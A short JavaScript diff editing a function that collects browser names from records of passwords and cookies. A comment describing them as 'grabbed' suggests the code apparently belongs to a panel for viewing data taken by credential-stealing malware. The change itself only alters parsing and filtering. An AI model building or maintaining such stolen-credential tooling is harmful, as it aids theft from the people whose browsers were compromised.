@@ -1222,7 +1222,8 @@
 
             function extractBrowserNames(data) {
                 const browserSet = new Set();
-
+                        
+                // Only from passwords and cookies – these are actually "grabbed"
                 if (data.passwords && Array.isArray(data.passwords)) {
                     data.passwords.forEach(p => {
                         if (p.browser && typeof p.browser === 'string') {
@@ -1239,26 +1240,7 @@
                     });
                 }
             
-                if (data.browsers) {
-                    if (Array.isArray(data.browsers)) {
-                        data.browsers.forEach(b => {
-                            if (typeof b === 'string') {
-                                browserSet.add(b);
-                            } else if (b && typeof b === 'object' && b.name && typeof b.name === 'string') {
-                                browserSet.add(b.name);
-                            } else if (b && typeof b === 'object' && b.browser && typeof b.browser === 'string') {
-                                browserSet.add(b.browser);
-                            }
-                        });
-                    } else if (typeof data.browsers === 'string') {
-                        browserSet.add(data.browsers);
-                    }
-                }
-            
-                if (data.browser && typeof data.browser === 'string') {
-                    browserSet.add(data.browser);
-                }
-            
+                // Remove junk / sensitive entries
                 const result = Array.from(browserSet).filter(name =>
                     name && name !== 'N/A' && name !== 'Unknown' && name !== 'undefined' && name !== 'Sensitive_Files' && name.length > 1
                 );
